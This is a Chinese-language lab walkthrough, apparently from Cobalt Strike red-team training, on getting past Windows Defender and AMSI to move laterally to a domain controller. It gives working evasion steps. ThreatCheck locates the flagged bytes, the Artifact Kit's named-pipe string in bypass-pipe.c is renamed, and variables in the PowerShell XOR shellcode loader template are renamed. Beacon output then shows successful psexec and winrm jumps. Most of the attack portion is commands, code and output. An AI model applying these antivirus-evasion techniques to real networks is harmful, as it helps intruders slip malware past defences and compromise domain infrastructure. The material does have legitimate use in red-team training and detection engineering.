# Bypassing Antivirus

可以列举C盘，但是无法横向，考虑bypass antivirus，如下显示
```
beacon> ls \\dc-2\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/19/2021 11:11:35   $Recycle.Bin
...<skip>...

beacon> jump psexec64 dc-2 smb
[-] Could not start service c8e8647 on dc-2: 225
[-] Could not connect to pipe: 2

beacon> jump winrm64 dc-2 smb
[-] Could not connect to pipe: 2

#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><Obj S="progress" RefId="0"><TN RefId="0"><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>Searching for available modules</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Processing</T><SR>-1</SR><SD>Searching UNC share \\dc-2\home$\nlamb\Documents\WindowsPowerShell\Modules.</SD></PR></MS></Obj><Obj S="progress" RefId="1"><TNRef RefId="0" /><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>Searching for available modules</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD>Searching UNC share \\dc-2\home$\nlamb\Documents\WindowsPowerShell\Modules.</SD></PR></MS></Obj><Obj S="progress" RefId="2"><TNRef RefId="0" /><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><S S="Error">At line:1 char:1_x000D__x000A_</S><S S="Error">+  Set-StrictMode -Version 2_x000D__x000A_</S><S S="Error">+ ~~~~~~~~~~~~~~~~~~~~~~~~~~_x000D__x000A_</S><S S="Error">This script contains malicious content and has been blocked by your antivirus software._x000D__x000A_</S><S S="Error">    + CategoryInfo          : ParserError: (:) [], ParseException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : ScriptContainedMaliciousContent_x000D__x000A_</S><S S="Error">    + PSComputerName        : dc-2_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>
```

上面xml文字出现了**This script contains malicious content and has been blocked by your antivirus software**字样，表明程序被AMSI（antimalware scan interface）杀掉了

```Get-MpThreatDetection```是一个 Windows Defender cmdlet，可以显示检测到的威胁
```
beacon> remote-exec winrm dc-2 Get-MpThreatDetection | select ActionSuccess, DomainUser, ProcessName, Resources

ActionSuccess  : True
DomainUser     : 
ProcessName    : Unknown
Resources      : {file:_C:\Windows\c8e8647.exe, file:_\\dc-2\ADMIN$\c8e8647.exe}
PSComputerName : dc-2
RunspaceId     : 19a06a6d-7a99-4df2-926b-415b8de45b04

ActionSuccess  : True
DomainUser     : DEV\nlamb
ProcessName    : C:\Windows\System32\wsmprovhost.exe
Resources      : {amsi:_C:\Windows\System32\wsmprovhost.exe}
PSComputerName : dc-2
RunspaceId     : 19a06a6d-7a99-4df2-926b-415b8de45b04
```

第一条是尝试使用```psexec64```,可执行程序```c8e8647.exe```已自动上传到靶机，但是被侦测到并被从硬盘上删除。

第二条是尝试使用```winrm64```,```wsmprovhost.exe```被AMSI从内存中侦测到，并且被阻止执行。

# Artifact Kit

[ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)是Matterpreter 的 DefenderCheck的修改版本。在这里用于扫描作为payload的二进制文件的阳性检测。

例子：
```
C:\>C:\Tools\ThreatCheck\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Payloads\beacon-smb-svc.exe
[+] Target file size: 289280 bytes
[+] Analyzing...

[...snip...]

[!] Identified end of bad bytes at offset 0x44E70
00000000   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················
00000010   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················
00000020   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················
00000030   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················
00000040   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················
00000050   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················
00000060   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················
00000070   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················
00000080   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················
00000090   5F 73 65 74 5F 69 6E 76  61 6C 69 64 5F 70 61 72   _set_invalid_par
000000A0   61 6D 65 74 65 72 5F 68  61 6E 64 6C 65 72 00 00   ameter_handler··
000000B0   77 69 6E 64 69 72 00 25  73 5C 53 79 73 74 65 6D   windir·%s\System
000000C0   33 32 5C 25 73 00 72 75  6E 64 6C 6C 33 32 2E 65   32\%s·rundll32.e
000000D0   78 65 00 00 00 00 00 00  00 00 00 00 00 00 00 00   xe··············
000000E0   25 63 25 63 25 63 25 63  25 63 25 63 25 63 25 63   %c%c%c%c%c%c%c%c
000000F0   25 63 4D 53 53 45 2D 25  64 2D 73 65 72 76 65 72   %cMSSE-%d-server

[*] Run time: 8.91s
```

```%c%c%c%c%c%c%c%c%cMSSE-%d-server```这行代码引起了报警。

搜索MSSE在套件中出现的位置，我们发现它位于```bypass-pipe.c```

出问题的貌似是这行代码
```
root@kali:/opt/cobaltstrike/artifact-kit# grep -r MSSE
src-common/bypass-pipe.c:       sprintf(pipename, "%c%c%c%c%c%c%c%c%cMSSE-%d-server", 92, 92, 46, 92, 112, 105, 112, 101, 92, (int)(GetTickCount() % 9898));
```

上面工具的逻辑是：创建一个命名管道，通过该dist-pipe管道读取 shellcode，然后执行它

管道的名称看起来是随机生成的，看起来像```\\.\pipe\MSSE-1866-server```,怀疑是这个随机的名称触发了报警

修改为以下代码,将字符串MSSE和server更改为不同的内容
```
sprintf(pipename, "%c%c%c%c%c%c%c%c%cRasta-%d-pipe", 92, 92, 46, 92, 112, 105, 112, 101, 92, (int)(GetTickCount() % 9898));
```

运行build.sh脚本重新构建程序
```
root@kali:/opt/cobaltstrike/artifact-kit# ./build.sh
```

在该```dist-pipe```目录中,artifacts新建了一个新的列表，包括一个```artifact.cna```文件，这个CNA文件会告诉Cobalt Strike使用这个artifacts列表里的文件，不要使用默认文件。

```
root@kali:/opt/cobaltstrike/artifact-kit# ls -l dist-pipe/
total 2108
-rwxr-xr-x 1 root root 312334 Mar 17 09:25 artifact32big.dll
-rwxr-xr-x 1 root root 310286 Mar 17 09:25 artifact32big.exe
-rwxr-xr-x 1 root root  41998 Mar 17 09:25 artifact32.dll
-rwxr-xr-x 1 root root  39950 Mar 17 09:25 artifact32.exe
-rwxr-xr-x 1 root root 311822 Mar 17 09:25 artifact32svcbig.exe
-rwxr-xr-x 1 root root  41486 Mar 17 09:25 artifact32svc.exe
-rwxr-xr-x 1 root root 311808 Mar 17 09:26 artifact64big.exe
-rwxr-xr-x 1 root root 312320 Mar 17 09:26 artifact64big.x64.dll
-rwxr-xr-x 1 root root  41472 Mar 17 09:26 artifact64.exe
-rwxr-xr-x 1 root root 313344 Mar 17 09:26 artifact64svcbig.exe
-rwxr-xr-x 1 root root  43008 Mar 17 09:26 artifact64svc.exe
-rwxr-xr-x 1 root root  41984 Mar 17 09:25 artifact64.x64.dll
-rw-r--r-- 1 root root   2031 Mar 17 09:25 artifact.cna
```

把整个文件夹拷贝到```C:\Tools\cobaltstrike\ArtifactKit```

```
C:\Tools\cobaltstrike>pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```

在 Cobalt Strike 中，会看到它已经加载，理论上无需再次加载，如果需要手动加载，转到```Cobalt Strike > Script Manager```

再次测试上面的输入文件
```
C:\Tools>C:\Tools\ThreatCheck\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Payloads\beacon-smb-svc-dist-pipe.exe
[+] No threat found!
[*] Run time: 0.89s
```

现在横向到DC2就不会被AV侦测到
```
beacon> jump psexec64 dc-2 smb
Started service c1d61c7 on dc-2
[+] established link to child beacon: 10.10.17.71
```

# Resource Kit

Resource Kit 包含Cobalt Strike基于脚本的有效载荷模板，包括PowerShell、VBA和HTA
```
PS C:\Tools\cobaltstrike\ResourceKit> ls

    Directory: C:\Tools\cobaltstrike\ResourceKit

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/30/2019   9:15 PM            205 compress.ps1
-a----         8/2/2018   2:17 AM           2979 README.txt
-a----         6/9/2020   6:31 PM           4359 resources.cna
-a----         4/3/2018   8:02 PM            830 template.exe.hta
...
```

template.x64.ps1是命令jump winrm64使用的模板

ThreatCheck检查
```
C:\>Tools\ThreatCheck\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -e AMSI -f Tools\cobaltstrike\ResourceKit\template.x64.ps1
[+] Target file size: 2371 bytes
[+] Analyzing...

[...snip...]

[!] Identified end of bad bytes at offset 0x703
00000000   6E 74 61 74 69 6F 6E 46  6C 61 67 73 28 27 52 75   ntationFlags('Ru
00000010   6E 74 69 6D 65 2C 20 4D  61 6E 61 67 65 64 27 29   ntime, Managed')
00000020   0A 0A 09 72 65 74 75 72  6E 20 24 76 61 72 5F 74   ···return $var_t
00000030   79 70 65 5F 62 75 69 6C  64 65 72 2E 43 72 65 61   ype_builder.Crea
00000040   74 65 54 79 70 65 28 29  0A 7D 0A 0A 49 66 20 28   teType()·}··If (
00000050   5B 49 6E 74 50 74 72 5D  3A 3A 73 69 7A 65 20 2D   [IntPtr]::size -
00000060   65 71 20 38 29 20 7B 0A  09 5B 42 79 74 65 5B 5D   eq 8) {··[Byte[]
00000070   5D 24 76 61 72 5F 63 6F  64 65 20 3D 20 5B 53 79   ]$var_code = [Sy
00000080   73 74 65 6D 2E 43 6F 6E  76 65 72 74 5D 3A 3A 46   stem.Convert]::F
00000090   72 6F 6D 42 61 73 65 36  34 53 74 72 69 6E 67 28   romBase64String(
000000A0   27 25 25 44 41 54 41 25  25 27 29 0A 0A 09 66 6F   '%%DATA%%')···fo
000000B0   72 20 28 24 78 20 3D 20  30 3B 20 24 78 20 2D 6C   r ($x = 0; $x -l
000000C0   74 20 24 76 61 72 5F 63  6F 64 65 2E 43 6F 75 6E   t $var_code.Coun
000000D0   74 3B 20 24 78 2B 2B 29  20 7B 0A 09 09 24 76 61   t; $x++) {···$va
000000E0   72 5F 63 6F 64 65 5B 24  78 5D 20 3D 20 24 76 61   r_code[$x] = $va
000000F0   72 5F 63 6F 64 65 5B 24  78 5D 20 2D 62 78 6F 72   r_code[$x] -bxor
```

看来是这段代码有问题
```
for ($x = 0; $x -lt $var_code.Count; $x++) {
  $var_code[$x] = $var_code[$x] -bxor 35
}
```

换变量名字:$x -> $i ， $var_code -> $var_banana
```
for ($i = 0; $i -lt $var_banana.Count; $i++) {
  $var_banana[$i] = $var_banana[$i] -bxor 35
}
```

再次检测，没有警报了
```
C:\>Tools\ThreatCheck\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -e AMSI -f Tools\cobaltstrike\ResourceKit\template.x64.ps1
[+] No threat found!
[*] Run time: 0.19s
```

通过Cobalt Strike > Script Manager加载resources.cna，现在可以横向了
```
beacon> jump winrm64 dc-2 smb
[+] established link to child beacon: 10.10.17.71
```